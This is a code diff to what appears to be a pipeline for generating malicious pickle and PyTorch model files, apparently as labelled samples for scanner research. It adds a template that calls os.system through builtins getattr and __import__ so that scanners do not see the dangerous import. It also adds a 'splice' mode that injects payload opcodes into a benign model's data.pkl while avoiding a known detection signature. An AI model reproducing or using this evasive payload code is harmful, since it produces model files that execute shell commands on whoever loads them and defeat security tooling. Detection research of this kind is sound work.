@@ -169,6 +169,56 @@ class ExternalModuleTemplate(AttackTemplate):
                                  self._args_for(payload_code))
 
 
+class IndirectChainTemplate(AttackTemplate):
+    """Stealth family: resolve the sink through a benign-builtins chain.
+
+    Instead of ``GLOBAL <dangerous-module> <sink>``, the stream evaluates::
+
+        __import__('<module>')            # benign global: builtins.__import__
+        getattr(<memoized module>, '<callable>')   # benign global: builtins.getattr
+
+    then calls the resolved sink with the wrapped payload. No GLOBAL operand
+    ever names the dangerous pair, so scanners keying rules on the GLOBAL
+    import see only ``builtins.__import__`` / ``builtins.getattr``. The
+    import is nested inside the getattr argument region, keeping the stack
+    balanced. Legacy py2 module aliases (``__builtin__``, ``copy_reg``) are
+    normalized because ``__import__`` resolves names literally on py3.
+    """
+
+    _ALIASES = {"__builtin__": "builtins", "copy_reg": "copyreg"}
+
+    def __init__(self, module_name: str = "os",
+                 callable_name: str = "system"):
+        super().__init__(self._ALIASES.get(module_name, module_name),
+                         callable_name)
+        # system(cmd-string) shell sink by default; callers may override.
+        self.sink_kind = "system"
+
+    def generate_pickle_payload(self, payload_code: str) -> bytes:
+        from pipeline.opcodes import OPCODES_BY_NAME
+
+        OP = OPCODES_BY_NAME
+        # Balanced getattr chain: __import__ nested inside the getattr args
+        # region (MARK..TUPLE), so no intermediate module ever stays on the
+        # stack. See pipeline.evasion.IndirectChain for the same pattern.
+        parts: list[bytes] = [
+            OP["GLOBAL"].code + b"builtins\ngetattr\n",
+            OP["MARK"].code,
+            OP["GLOBAL"].code + b"builtins\n__import__\n",
+            pickle.dumps((self.module_name,), protocol=2)[2:-1],
+            OP["REDUCE"].code,
+            OP["SHORT_BINUNICODE"].code + bytes([len(self.callable_name)])
+            + self.callable_name.encode("utf-8"),
+            OP["TUPLE"].code,
+            OP["REDUCE"].code,
+            # sink(*args_for(payload))
+            pickle.dumps(self._args_for(payload_code), protocol=2)[2:-1],
+            OP["REDUCE"].code,
+            OP["STOP"].code,
+        ]
+        return OP["PROTO"].code + b"\x04" + b"".join(parts)
+
+
 def _generate_payload(module_name: str, class_name: str, args: tuple) -> bytes:
     """Generate pickle bytes that call ``module_name.class_name`` with ``args``.
 
@@ -198,6 +248,7 @@ FAMILY_TEMPLATES: dict[str, AttackTemplate] = {
     "overwritten": OverwrittenModuleTemplate(),
     "pypi_injected": PyPIInjectedTemplate(),
     "external": ExternalModuleTemplate(),
+    "indirect_chain": IndirectChainTemplate(),
 }
 
 FAMILIES: tuple[str, ...] = ("gadget",) + tuple(FAMILY_TEMPLATES)
@@ -208,6 +259,7 @@ FAMILY_LABELS: dict[str, str] = {
     "overwritten": "shadowpickle_overwritten",
     "pypi_injected": "shadowpickle_pypi_injected",
     "external": "shadowpickle_external",
+    "indirect_chain": "shadowpickle_indirect_chain",
 }
 
 
@@ -264,26 +316,70 @@ def inject_payload_into_pickle(benign_pkl_path: str, malicious_pkl_path: str, pa
         pickle.dump(data, f)
 
 
-def inject_payload_into_torch(benign_pt_path: str, malicious_pt_path: str, payload_bytes: bytes) -> None:
-    """Load a benign PyTorch model safely, insert the payload helper object, and save to malicious_pt_path."""
+def inject_payload_into_torch(benign_pt_path: str, malicious_pt_path: str, payload_bytes: bytes,
+                              transport: str = "loads") -> None:
+    """Load a benign PyTorch model safely, insert the payload helper object, and save to malicious_pt_path.
+
+    ``transport`` selects how the payload reaches execution during torch.load:
+
+    * ``"loads"`` (legacy default) -- wrap the payload in an outer
+      ``_pickle.loads(BINBYTES(...))`` call appended before STOP. Note: this
+      transport itself carries a flagged signature in modern scanners
+      (``global:_pickle.loads``); it is kept for backwards compatibility.
+    * ``"splice"`` (evasion) -- splice the payload's own opcodes directly
+      before the trailing STOP, discarding its return value with a POP so the
+      benign state dict stays top-of-stack. No extra GLOBAL is introduced:
+      detection now depends solely on the payload's own sinks.
+
+    The payload must be a complete standalone pickle stream ending in STOP.
+    """
     import zipfile
     import struct
+
+    if transport not in ("loads", "splice"):
+        raise ValueError(f"unknown transport: {transport}")
 
     with zipfile.ZipFile(benign_pt_path, "r") as z_in:
         with zipfile.ZipFile(malicious_pt_path, "w", compression=zipfile.ZIP_DEFLATED) as z_out:
             for item in z_in.infolist():
                 data = z_in.read(item.filename)
                 if item.filename.endswith("data.pkl"):
-                    # Find the STOP opcode at the end (b'.') and inject the loads call
+                    # Find the STOP opcode at the end (b'.') and inject before it.
                     if data.endswith(b"."):
-                        injection = (
-                            b"c_pickle\nloads\n"
-                            b"("
-                            b"B" + struct.pack("<I", len(payload_bytes)) + payload_bytes +
-                            b"t"
-                            b"R"
-                            b"0"
-                        )
+                        if transport == "loads":
+                            injection = (
+                                b"c_pickle\nloads\n"
+                                b"("
+                                b"B" + struct.pack("<I", len(payload_bytes)) + payload_bytes +
+                                b"t"
+                                b"R"
+                                b"0"
+                            )
+                        else:  # splice
+                            from pipeline.opcodes import parse_pickle, OPCODES_BY_NAME
+                            ops = parse_pickle(payload_bytes)
+                            assert ops[-1][0].name == "STOP", "payload must end with STOP"
+                            # torch.load reads ONE object: keep only ops up to
+                            # the FIRST STOP. Trailing stacked streams (never
+                            # executed by torch.load) would otherwise fuse into
+                            # the host frame as unreachable corrupt bytes.
+                            first_stop = next(
+                                i for i, (o, _a) in enumerate(ops)
+                                if o.name == "STOP")
+                            # Drop FRAME opcodes from the spliced body: they
+                            # are optional batching hints, and a nested frame
+                            # inside the still-open outer frame raises
+                            # "beginning of a new frame before end of
+                            # current frame".
+                            body = b"".join(
+                                op.code + arg for op, arg in ops[:first_stop]
+                                if op.name != "FRAME"
+                            )
+                            # Balance the host stack: discard whatever the
+                            # spliced stream leaves above the benign object.
+                            if not body.endswith(OPCODES_BY_NAME["POP"].code):
+                                body += OPCODES_BY_NAME["POP"].code
+                            injection = body
                         rebuilt = data[:-1] + injection + b"."
                         # Fix FRAME sizes if protocol >= 4
                         if len(rebuilt) > 11 and rebuilt[0] == 0x80 and rebuilt[2] == 0x95:
